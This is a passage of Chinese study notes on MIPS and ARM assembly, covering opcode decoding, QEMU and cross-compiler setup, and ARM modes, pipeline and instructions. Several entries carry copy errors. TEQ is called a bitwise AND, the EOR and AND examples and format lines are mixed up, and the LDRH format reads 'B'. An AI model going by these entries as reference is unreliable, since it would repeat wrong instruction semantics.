<h4 id="MIPS-Opcode解析"><a href="#MIPS-Opcode解析" class="headerlink" title="MIPS Opcode解析"></a><strong>MIPS Opcode解析</strong></h4><p>机器指令：0xAF8020</p>
<p>二进制形式：0000 0000 1010 1111 1000 0000 0010 0000</p>
<p>解析：按照MIPS指令格式，前6bit为000000，通过查表可知该指令为R格式指令，rs处的5bit值为5（十进制），指代寄存器r5（$a1），rt处的5bit值为15（十进制），指代寄存器r15（$t7)，rd处的5bit值为16（十进制），指代寄存器r16（$s0），偏移位为0，通过funct位可以查看该指令的类型，通过查表后可得该指令类型为add。</p>
<p>综上，该指令可以解析为<code>add $s0,$a1,$t7</code></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811085153206.png" alt="image-20220811085153206"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811085031456.png" alt="image-20220811085031456"></p>
<h3 id="3-MIPS汇编"><a href="#3-MIPS汇编" class="headerlink" title="3. MIPS汇编"></a>3. MIPS汇编</h3><p>常见运算：算术运算、移位运算、逻辑运算、跳转运算、载入指令···</p>
<h4 id="3-1-ADD指令"><a href="#3-1-ADD指令" class="headerlink" title="3.1 ADD指令"></a>3.1 ADD指令</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811001203920.png" alt="image-20220811001203920"></p>
<p>格式：<code>ADD rd,rs,rt</code></p>
<p>作用：将rs和rt相加，将结果保存在rd中</p>
<p>例子：<code>ADD $t0,$s1,$s2</code></p>
<p>相关指令：ADD、ADDI、ADDIU、ADDU、ADDIUPC</p>
<h4 id="3-2-SLL指令"><a href="#3-2-SLL指令" class="headerlink" title="3.2 SLL指令"></a>3.2 SLL指令</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811001508732.png" alt="image-20220811001508732"></p>
<p>格式：<code>SLL rd,rt,sa</code></p>
<p>作用：将rt左移sa位，并将结果存入rd</p>
<p>例子：<code>SLL $1,$2,10</code></p>
<p>相关指令：SLLV、SLT、SLTI、SLTU、SLTIU</p>
<h4 id="3-3-XOR指令"><a href="#3-3-XOR指令" class="headerlink" title="3.3 XOR指令"></a>3.3 XOR指令</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811001651907.png" alt="image-20220811001651907"></p>
<p>格式：<code>XOR rd,rs,rt</code></p>
<p>作用：将rs和rt进行异或运算，将结果放入rd</p>
<p>例子：<code>XOR 1,$2,$3</code></p>
<p>相关指令：XORI</p>
<h4 id="3-4-MOVZ指令"><a href="#3-4-MOVZ指令" class="headerlink" title="3.4 MOVZ指令"></a>3.4 MOVZ指令</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811001849384.png" alt="image-20220811001849384"></p>
<p>格式：<code>MOVZ rd,rs,rt</code></p>
<p>作用：转移</p>
<p>例子：<code>MOVZ R1,R2,R3</code></p>
<p>相关指令：MOVE、MOVT、MOVF、MOVN</p>
<h4 id="3-5-BNE指令"><a href="#3-5-BNE指令" class="headerlink" title="3.5 BNE指令"></a>3.5 BNE指令</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811002039090.png" alt="image-20220811002039090"></p>
<p>格式：<code>BNE rs,rt,offset</code></p>
<p>作用：跳转</p>
<p>例子：<code>BNE $1,$2,10</code></p>
<p>相关指令：B、BC2TL、BAL、BC、BEQ、BEQL</p>
<h4 id="3-6-LW指令"><a href="#3-6-LW指令" class="headerlink" title="3.6 LW指令"></a>3.6 LW指令</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811002242842.png" alt="image-20220811002242842"></p>
<p>格式：<code>LW rt,offset(base)</code></p>
<p>作用：加载</p>
<p>例子：<code>LW $1,10($2)</code></p>
<p>相关代码：LW、LWC1、LWC2、LWE、LWL、LWLE</p>
<h3 id="4-MIPS环境搭建"><a href="#4-MIPS环境搭建" class="headerlink" title="4. MIPS环境搭建"></a>4. MIPS环境搭建</h3><ul>
<li><p>操作系统：Ubuntu x64 TLS&#x2F;Windows 10</p>
</li>
<li><p><strong>MIPS IDE</strong>：MARS 4.5</p>
</li>
</ul>
<p>下载地址：<a href="http://courses.missouristate.edu/kenvollmar/mars/download.htm">http://courses.missouristate.edu/kenvollmar/mars/download.htm</a></p>
<ul>
<li><p>在线网站：<a href="https://rivoire.cs.sonoma.edu/cs351/wemips/">https://rivoire.cs.sonoma.edu/cs351/wemips/</a></p>
</li>
<li><p><strong>交叉编译</strong>：mips-linux-gnu*</p>
</li>
<li><p><strong>模拟环境</strong>：qemu</p>
</li>
</ul>
<h4 id="Qemu介绍及安装"><a href="#Qemu介绍及安装" class="headerlink" title="Qemu介绍及安装"></a>Qemu介绍及安装</h4><p>QEMU是一套由Fabrice Bellard所编写的模拟处理器的自由软件。它与Bochs，PearPC相似，但其具有某些后两者所不具备的特性，如高速度及跨平台的特性。经由kqemu这个开源的加速器，QEMU能模拟至接近真实电脑的速度。</p>
<p>qemu两种模式：</p>
<ul>
<li>User mode：用户模式</li>
<li>System mode：系统模式</li>
</ul>
<p>安装方式：</p>
<p>Linux命令行安装：<code>sudo apt-get install qemu</code></p>
<p>安装用户模式：<code>sudo apt-get install qemu-user-static</code></p>
<h4 id="MIPS交叉编译"><a href="#MIPS交叉编译" class="headerlink" title="MIPS交叉编译"></a>MIPS交叉编译</h4><p><strong>MIPS交叉编译链接工具-gcc-mips-linux-gnu</strong></p>
<p><code>sudo apt-get install linux-libc-dev-mips-cross</code></p>
<p><code>sudo apt-get install libc6-mips-cross libc6-dev-mips-cross</code></p>
<p><code>sudo apt-get install binutils-mips-linux-gnu gcc-mips-linux-gnu</code></p>
<p>上述三行命令安装动态链接库帮助编译程序。</p>
<p><code>sudo apt-get install g++-mips-linux-gnu</code></p>
<p><strong>MIPS交叉编译链接工具-gcc-mipsel-linux-gnu</strong></p>
<p><code>sudo apt-get install linux-libc-dev-mipsel-cross</code></p>
<p><code>sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross</code></p>
<p><code>sudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu</code></p>
<p><code>sudo apt-get install g++-mipsel-linux-gnu</code></p>
<h3 id="5-MIPS汇编实战"><a href="#5-MIPS汇编实战" class="headerlink" title="5. MIPS汇编实战"></a>5. MIPS汇编实战</h3><p>MIPS IDE :MARS 4.5 见看雪课程。</p>
<h4 id="QEMU示例"><a href="#QEMU示例" class="headerlink" title="QEMU示例"></a>QEMU示例</h4><p>demo.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态编译：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811091214936.png" alt="image-20220811091214936"></p>
<p>采用动态编译方式在qemu进行模拟时需要手动链接上动态链接库，位置在<code>/usr/mipsel-linux-gnu/lib</code>目录下。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811091613936.png" alt="image-20220811091613936"></p>
<p>静态编译：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220811091846312.png" alt="image-20220811091846312"></p>
<h2 id="0x03-ARM基础"><a href="#0x03-ARM基础" class="headerlink" title="0x03 ARM基础"></a>0x03 ARM基础</h2><h3 id="1-什么是ARM？"><a href="#1-什么是ARM？" class="headerlink" title="1. 什么是ARM？"></a>1. 什么是ARM？</h3><h4 id="1-1-什么是ARM？"><a href="#1-1-什么是ARM？" class="headerlink" title="1.1 什么是ARM？"></a>1.1 什么是ARM？</h4><p>ARM架构，曾称进阶精简指令集机器（Advanced RISC Machine）更早称作Acorn RISC Machine，是一个32位精简指令集（RISC）处理器架构。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813093104678.png" alt="image-20220813093104678"></p>
<h4 id="1-2-ARM发展史"><a href="#1-2-ARM发展史" class="headerlink" title="1.2 ARM发展史"></a>1.2 ARM发展史</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813093602740.png" alt="image-20220813093602740"></p>
<h4 id="1-3-ARM大小端"><a href="#1-3-ARM大小端" class="headerlink" title="1.3 ARM大小端"></a>1.3 ARM大小端</h4><p>最高有效位MSB（Most Significant Bit）对应大端（Big-endian）</p>
<p>最低有效位LSB（Least Significant Bit）对应小端（Little-endian）</p>
<ul>
<li>armel：arm eabi little endian的缩写，软件浮点</li>
<li>armhf：arm hard float的缩写，硬件浮点</li>
<li>arm64：64位的arm默认就是hf的，因此不需要hf的后缀</li>
</ul>
<h3 id="2-ARM应用领域"><a href="#2-ARM应用领域" class="headerlink" title="2. ARM应用领域"></a>2. ARM应用领域</h3><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813094132481.png" alt="image-20220813094132481"></p>
<h3 id="3-ARM基础"><a href="#3-ARM基础" class="headerlink" title="3. ARM基础"></a>3. ARM基础</h3><h4 id="3-1-ARM运行模式"><a href="#3-1-ARM运行模式" class="headerlink" title="3.1 ARM运行模式"></a>3.1 ARM运行模式</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813094246663.png" alt="image-20220813094246663"></p>
<p>ARM有9种运行模式，图中为常见7种，不同模式之间可以通过特定的指令来控制切换。</p>
<h4 id="3-2-ARM工作状态"><a href="#3-2-ARM工作状态" class="headerlink" title="3.2 ARM工作状态"></a>3.2 ARM工作状态</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813094833041.png" alt="image-20220813094833041"></p>
<h4 id="3-3-进入不同工作方式的方法"><a href="#3-3-进入不同工作方式的方法" class="headerlink" title="3.3 进入不同工作方式的方法"></a>3.3 进入不同工作方式的方法</h4><ol>
<li><p>进入Thumb状态</p>
<p>（1）执行BX指令，并设置操作数寄存器的状态（位[0]）为1。</p>
<p>（2）在Thumb状态进入异常（所有的异常都是ARM状态，当异常处理返回时自动转换Thumb指令</p>
</li>
<li><p>进入ARM状态</p>
<p>（1）执行BX指令，并设置操作数寄存器的状态（位[0]为0）</p>
<p>（2）进入异常时，将PC放入异常模式链接寄存器中，从异常向量地址开始执行也可进入ARM状态</p>
</li>
</ol>
<h4 id="3-4-ARM工作状态寄存器"><a href="#3-4-ARM工作状态寄存器" class="headerlink" title="3.4 ARM工作状态寄存器"></a>3.4 ARM工作状态寄存器</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813095408586.png" alt="image-20220813095408586"></p>
<p>R1-R7类似于通用寄存器，R13堆栈相关，R14与函数返回相关，R15全局PC。</p>
<h4 id="3-4-Thumb工作状态寄存器"><a href="#3-4-Thumb工作状态寄存器" class="headerlink" title="3.4 Thumb工作状态寄存器"></a>3.4 Thumb工作状态寄存器</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813095846784.png" alt="image-20220813095846784"></p>
<h4 id="3-5-Thumb状态与ARM状态寄存器"><a href="#3-5-Thumb状态与ARM状态寄存器" class="headerlink" title="3.5 Thumb状态与ARM状态寄存器"></a>3.5 Thumb状态与ARM状态寄存器</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813095932359.png" alt="image-20220813095932359"></p>
<h3 id="4-ARM流水线"><a href="#4-ARM流水线" class="headerlink" title="4. ARM流水线"></a>4. ARM流水线</h3><ul>
<li>CPU流水线，把一条指令分为多个处理阶段</li>
<li>ARM使用三级流水线，加速指令处理速度</li>
<li>ARM的三级流水分别是：取址（fetch）、译码（decode）、执行（execute）。PC指向fetch的指令</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813100256681.png" alt="image-20220813100256681"></p>
<h2 id="0x04-ARM汇编"><a href="#0x04-ARM汇编" class="headerlink" title="0x04 ARM汇编"></a>0x04 ARM汇编</h2><h3 id="1-ARM指令集"><a href="#1-ARM指令集" class="headerlink" title="1. ARM指令集"></a>1. ARM指令集</h3><h4 id="1-1-ARM状态"><a href="#1-1-ARM状态" class="headerlink" title="1.1 ARM状态"></a>1.1 ARM状态</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813100844166.png" alt="image-20220813100844166"></p>
<h4 id="1-2-ARM指令集"><a href="#1-2-ARM指令集" class="headerlink" title="1.2 ARM指令集"></a>1.2 ARM指令集</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813101039332.png" alt="image-20220813101039332"></p>
<h5 id="1-2-1-数据处理指令"><a href="#1-2-1-数据处理指令" class="headerlink" title="1.2.1 数据处理指令"></a>1.2.1 数据处理指令</h5><p><strong>MOV指令</strong>：它的传送指令只能是把一个寄存器的值（要能用立即数表示）赋给另一个寄存器，或者将一个常量赋给寄存器，将后边的量赋给前边的量。</p>
<p>格式：<code>MOV&#123;条件&#125;&#123;S&#125; 目的寄存器,源操作数</code></p>
<p>MOV指令中，条件缺省时指令无条件执行；S选项决定指令的操作是否影响CPSR中的条件标志位的值，当没有S时指令不更新CPSR中条件标志位的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指令示例:</span><br><span class="line">MOV R1,R0	;将寄存器R0的值传送给寄存器R1</span><br><span class="line">MOV PC,R14	;将寄存器R14的值传送到PC，常用于子程序返回</span><br><span class="line">MOV R1,R0,LSL#3 ;将寄存器R0的值左移3位后传送到1（即乘8）</span><br><span class="line">MOVS PC,R14 ;将寄存器R14的值传送到PC中，返回到调用代码并恢复标志位</span><br></pre></td></tr></table></figure>

<p>除了MOV指令外，还有数据取反指令MVN。</p>
<p>指令格式：<code>MVN&#123;条件&#125;&#123;S&#125; 目的寄存器,源操作数</code></p>
<p>MVN指令可完成从另一个寄存器、被移位的寄存器、或把一个立即数加载到目的寄存器。与MOV指令不同之处是在传送之前按位被取反了，即把一个被取反的值传送到目的寄存器中。其中S选项决定指令的操作是否影响CPSR中的条件标志位的值，当没有S时指令不更新CPSR中条件标志位的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指令示例:</span><br><span class="line">MVN R0,#0	;将立即数0取反传送到寄存器R0中，完成后R0=-1（有符号数）</span><br></pre></td></tr></table></figure>

<h5 id="1-2-2-算数运算指令"><a href="#1-2-2-算数运算指令" class="headerlink" title="1.2.2 算数运算指令"></a>1.2.2 算数运算指令</h5><p><strong>加法指令：ADD</strong></p>
<p>格式：<code>ADD&#123;条件&#125;&#123;S&#125; 目的寄存器,操作数1,操作数2</code></p>
<p>ADD指令用于把两个操作数相加，并将结果存放在目的寄存器中。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指令示例:</span><br><span class="line">ADD R0,R1,R2	;R0 = R1 + R2</span><br><span class="line">ADD R0,R1,#256	;R0 = R1 + 256</span><br><span class="line">ADD R0,R2,R3,LSL#1	;R0 = R2 + (R3&lt;&lt;1)</span><br></pre></td></tr></table></figure>

<p><strong>带进位的加法指令：ADC</strong></p>
<p>格式：<code>ADC&#123;条件&#125;&#123;S&#125; 目的寄存器,操作数1,操作数2</code></p>
<p>ADC指令用于把两个操作数相加，再加上CPSR中的C条件标志位的值，并将结果存放到目的寄存器中。它使用一个进位标志位，这样就可以做比32位大的数的加法，注意不要忘记设置S后缀来更改进位标志。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。</p>
<p><strong>减法指令：SUB</strong></p>
<p>格式：<code>SUB&#123;条件&#125;&#123;S&#125; 目的寄存器,操作数1,操作数2</code></p>
<p>SUB指令用于把操作数1减去操作数2，并将结果存放到目的寄存器中。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。该指令可用于有符号数或无符号数的减法运算。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指令示例:</span><br><span class="line">SUB R0,R1,R2	;R0 = R1 - R2</span><br><span class="line">SUB R0,R1,#256	;R0 = R1 - 256</span><br><span class="line">SUB R0,R2,R3,LSL#1	;R0 = R2 - (R3&lt;&lt;1)</span><br></pre></td></tr></table></figure>

<p><strong>带借位减法指令：SBC</strong></p>
<p>格式：<code>SBC&#123;条件&#125;&#123;S&#125; 目的寄存器,操作数1,操作数2</code></p>
<p>SBC指令用于把操作数1减去操作数2，再减去CPSR中的c条件标志位的反码，并将结果存放到目的寄存器中。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。该指令使用进位标志位来表示借位，这样就可以做大于32位的减法，注意不要忘记设置S后缀来更改标志位。该指令可用于有符号数或无符号数的减法运算。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUBS R0,R1,R2	;R0 =R1 - R2 -!c,并根据结果设置CPSR的进位标志位</span><br></pre></td></tr></table></figure>

<h5 id="1-2-3-比较指令"><a href="#1-2-3-比较指令" class="headerlink" title="1.2.3 比较指令"></a>1.2.3 比较指令</h5><p><strong>直接比较指令：CMP</strong></p>
<p>格式：<code>CMP&#123;条件&#125; 操作数1,操作数2</code></p>
<p>CMP指令用于把一个寄存器的内容和另一个寄存器的内容或立即数进行比较，同时更新CPSR中的条件标志位的值。该指令进行一次减法运算，但不存储结果，只改变条件标志位。标志位表示的是操作数1与操作数2的关系（大、小、相等），例如，当操作数1大于操作数2，则此后的有GT后缀的指令将可以执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指令示例:</span><br><span class="line">CMP R1,R0	;将寄存器R1的值与寄存器R0的值相减，并根据结果设置CPSR的标志位</span><br><span class="line">CMP R1，#100	；将寄存器R1的值与立即数100相减，并根据结果设置CPSR的标志位</span><br></pre></td></tr></table></figure>

<p><strong>位测试指令：TST</strong></p>
<p>格式：<code>TST&#123;条件&#125; 操作数1,操作数2</code></p>
<p>TST指令用于把一个寄存器的内容和另一个寄存器的内容或立即数进行按位的与运算，并根据运算结果更新CPSR中的条件标志位的值。操作数1是要测试的数据，而操作数2是一个位掩码，该指令一般用来检测是否设置了特定的位。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指令示例:</span><br><span class="line">TST R1,#%1	;用于测试在寄存器R1中是否设置了最低位（%表示二进制数）</span><br><span class="line">TST R1，#0xffe	;将寄存器R1的值与立即数0xffe按位与，并根据结果设置CPSR的标志位</span><br></pre></td></tr></table></figure>

<p><strong>位测试指令：TEQ</strong></p>
<p>格式：<code>TEQ&#123;条件&#125; 操作数1,操作数2</code></p>
<p>TEQ指令用于把一个寄存器的内容和另一个寄存器的内容或立即数进行按位的与运算，并根据运算结果更新CPSR中的条件标志位的值。该指令通常用于比较操作数1和操作数2是否相等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEQ R1,R2	;将寄存器R1的值与寄存器R2的值按位异或，并根据结果设置CPSR的标志位</span><br></pre></td></tr></table></figure>

<h5 id="1-2-4-逻辑运算指令"><a href="#1-2-4-逻辑运算指令" class="headerlink" title="1.2.4 逻辑运算指令"></a>1.2.4 逻辑运算指令</h5><p><strong>逻辑与指令：AND</strong></p>
<p>格式：<code>ADD&#123;条件&#125;&#123;S&#125; 目的寄存器,操作数1,操作数2</code></p>
<p>AND指令用于在两个操作数上进行逻辑与运算，并把结果放置到目的寄存器中。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。该指令常用于屏蔽操作数1的某些位。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND R0,R0,#3	;该指令保持R0的0，1位，其余位清零</span><br></pre></td></tr></table></figure>

<p><strong>逻辑异或指令：EOR</strong></p>
<p>格式：<code>EOR&#123;条件&#125;&#123;S&#125; 目的寄存器,操作数1,操作数2</code></p>
<p>EOR指令用于在两个操作数上进行逻辑异或运算，并把结果放置到目的寄存器中。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。该指令常用于反转操作数1的某些位。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND R0,R0,#3	;该指令反转R0的0，1位，其余位保持不变</span><br></pre></td></tr></table></figure>



<p><strong>位清零指令：BIC</strong></p>
<p>格式：<code>BIC&#123;条件&#125;&#123;S&#125; 目的寄存器,操作数1,操作数2</code></p>
<p>BIC指令用于清楚操作数1的某些位，并把结果放置到目的寄存器中。操作数1应是一个寄存器，操作数2可以是一个寄存器，被移位的寄存器，或一个立即数。操作数2位32位的掩码，如果在掩码中设置了某一位，则清除这一位。未设置的掩码位保持不变。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BIC R0,R0 #%1011	;该指令清楚R0中的位0、1、3，其余的位保持不变</span><br></pre></td></tr></table></figure>

<h5 id="1-2-5-转移指令"><a href="#1-2-5-转移指令" class="headerlink" title="1.2.5 转移指令"></a>1.2.5 转移指令</h5><p>跳转指令用于实现程序流程的跳转，在ARM程序中有两种方法可以实现程序流程的跳转。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813105909396.png" alt="image-20220813105909396"></p>
<p>ARM指令集中的跳转指令可以完成从当前指令向前或向后的32MB的地址空间的跳转，包括以下4条指令</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813110005405.png" alt="image-20220813110005405"></p>
<p><strong>B指令</strong></p>
<p>格式：<code>B&#123;条件&#125; 目的地址</code></p>
<p>B指令是最简单的跳转指令。一旦遇到一个B指令，ARM处理器将立即跳转到给定的目标地址，从那里继续执行。注意存储在跳转指令中的实际值是相对于当前PC值的一个偏移量，而不是一个绝对地址，它的值由汇编器来来计算（参考寻址方式中的相对寻址）。它是24位有符号数，左移两位后有符号扩展为32位，表示的有效偏移位26位（前后32MB的地址空间）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B Label	;程序无条件跳转到标号Label处执行</span><br><span class="line">CMP R1，#0	；当CPSR寄存器中的Z条件码置位时，程序跳转到标号Label处执行	</span><br><span class="line">BEQ Label</span><br></pre></td></tr></table></figure>

<p><strong>BL指令</strong></p>
<p>格式：<code>BL&#123;条件&#125; 目标地址</code></p>
<p>BL是另一个跳转指令，但跳转之前，会在寄存器R14中保存PC的当前内容，因此，可以通过R14的内容重新加载到PC中，来返回到跳转指令之后的那个指令处执行。该指令是实现子程序调用的一个基本但常用的手段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BL Label	;当程序无条件跳转到标号Label处执行时，同时将当前的PC值保存到R14中</span><br></pre></td></tr></table></figure>

<p><strong>BLX指令</strong></p>
<p>格式：<code>BLX 目标地址</code></p>
<p>BLX指令从ARM指令集跳转到指令中所指定的目标地址，并将处理器的工作状态由ARM状态切换到Thumb状态，该指令同时将PC的当前内容保存到寄存器R14中。因此，当子程序使用Thumb指令集，而调用者使用ARM指令集时，可以通过BLX指令实现子程序的调用和处理器工作状态的切换。同时，子程序的返回可以通过将寄存器R14值复制到PC中来完成。</p>
<p><strong>BX指令</strong></p>
<p>格式：<code>BX&#123;条件&#125; 目标地址</code></p>
<p>BX指令跳转到指令中所指定的目标地址，目标地址处的指令既可以是ARM指令，也可以是Thumb指令。</p>
<h5 id="1-2-6-状态寄存器访问指令"><a href="#1-2-6-状态寄存器访问指令" class="headerlink" title="1.2.6 状态寄存器访问指令"></a>1.2.6 状态寄存器访问指令</h5><p><strong>MRS指令</strong></p>
<p>格式：<code>MRS&#123;条件&#125; 通用寄存器,程序状态寄存器（CPSR或SPSR）</code></p>
<p>MRS指令用于将程序状态寄存器的内容传送到通用寄存器中。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813191948350.png" alt="image-20220813191948350"></p>
<p><strong>MSR指令</strong></p>
<p>格式：<code>MSR&#123;条件&#125; 程序状态寄存器（CPSR或SPSR）_&lt;域&gt;,操作数</code></p>
<p>MSR指令用于将操作数的内容传送到程序状态寄存器的特定域中。其中，操作数可以为通用寄存器或立即数。&lt;域&gt;用于设置程序状态寄存器中需要的位，32位的程序状态寄存器可以分为4个域：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位[31:24]为条件标志位域，用f表示;</span><br><span class="line">位[23:16]为状态位域，用s表示;</span><br><span class="line">位[15:8]为扩展位域，用x表示;</span><br><span class="line">位[7:0]为控制位域，用c表示;</span><br></pre></td></tr></table></figure>

<h5 id="1-2-7-加载-存储指令"><a href="#1-2-7-加载-存储指令" class="headerlink" title="1.2.7 加载&#x2F;存储指令"></a>1.2.7 加载&#x2F;存储指令</h5><p>ARM微处理器支持加载&#x2F;存储指令用于寄存器和存储器之间传送数据，加载指令用于将存储器中的数据传送到寄存器，存储指令则完成相反的操作。</p>
<p><strong>LDR指令</strong></p>
<p>格式：<code>LDR&#123;条件&#125; 目的寄存器,&lt;存储器地址&gt;</code></p>
<p>LDR指令用于从存储器中将一个32位的子数据传送到目的寄存器中。该指令通常用于从存储器中读取32位的字数据到通用寄存器，然后对数据进行处理。当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当作目的地址，从而可以实现程序流程的跳转。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813193209606.png" alt="image-20220813193209606"></p>
<p><strong>LDRB指令</strong></p>
<p>格式：<code>LDR&#123;条件&#125;B 目的寄存器,&lt;存储器地址&gt;</code></p>
<p>LDRB指令用于从存储器中将一个8位的字节数据传送到目的寄存器中，同时将寄存器的高24位清零。该指令通常用于从存储中读取8位的字节数据到通用寄存器，然后对数据进行处理。当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当作目的地址，从而可以实现程序流程的跳转。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813193508314.png" alt="image-20220813193508314"></p>
<p><strong>LDRH指令</strong></p>
<p>格式：<code>LDR&#123;条件&#125;B 目的寄存器,&lt;存储器地址&gt;</code></p>
<p>LDRH指令用于从存储器中将一个16位的半字数据传送到目的寄存器中，同时将寄存器的高16位清零。该指令通常用于从存储器中读取16位的半字数据到通用寄存器，然后对数据进行处理。当程序计数器PC作为目的寄存器时，指令从存储器中读取的字数据被当作目的地址，从而可以实现程序流程的跳转。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813193831024.png" alt="image-20220813193831024"></p>
<p><strong>STR指令</strong></p>
<p>格式：<code>STR&#123;条件&#125; 源寄存器,&lt;存储器地址&gt;</code></p>
<p>STR指令用于从源寄存器中将一个32位的字数据传送到存储器中。该指令在程序设计中比较常用，且寻址方式灵活多样，使用方式可参考指令LDR。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813194135404.png" alt="image-20220813194135404"></p>
<p><strong>STRB指令</strong></p>
<p>格式：<code>STR&#123;条件&#125;B 源寄存器,&lt;存储地址&gt;</code></p>
<p>STRB指令用于从源寄存器中将一个8位的字节数据传送到存储器中。该字节数据为源寄存器中的低8位。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813194326534.png" alt="image-20220813194326534"></p>
<p><strong>STRH指令</strong></p>
<p>格式：<code>STR&#123;条件&#125;H 源寄存器,&lt;存储器地址&gt;</code></p>
<p>STRH指令用于从源寄存器中将一个16位的半字数据传送到存储器中。该半字数据为源寄存器中的低16位。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813194537615.png" alt="image-20220813194537615"></p>
<p><strong>批量数据加载&#x2F;存储指令</strong></p>
<p>ARM微处理器所支持批量数据加载&#x2F;存储指令可以一次在一片连续的存储器单元和多个寄存器之间传送数据，批量加载指令用于将一片连续的存储器中的数据传送到多个寄存器，批量数据存储指令则完成相反的操作。常见的加载存储指令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">—LDM 批量数据加载指令</span><br><span class="line">—STM 批量数据存储指令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">【LDM(或STM)指令】</span><br><span class="line">LDM（或STM）指令的格式:</span><br><span class="line">LDM（或STM）&#123;条件&#125;&#123;状态&#125; 基址寄存器&#123;!&#125;,寄存器列表&#123;^&#125;</span><br></pre></td></tr></table></figure>

<p><strong>LDM（或STM）指令</strong></p>
<p>用于从基址寄存器所指示的一片连续存储器列表所指示的多个寄存器之间传送数据，该指令的常见用途是将多个寄存器的内容入栈或出栈。其中，{类型}为以下几种情况：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220813214539464.png" alt="image-20220813214539464"></p>
<p>{!}为可选后缀，若选用该后缀，则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。</p>
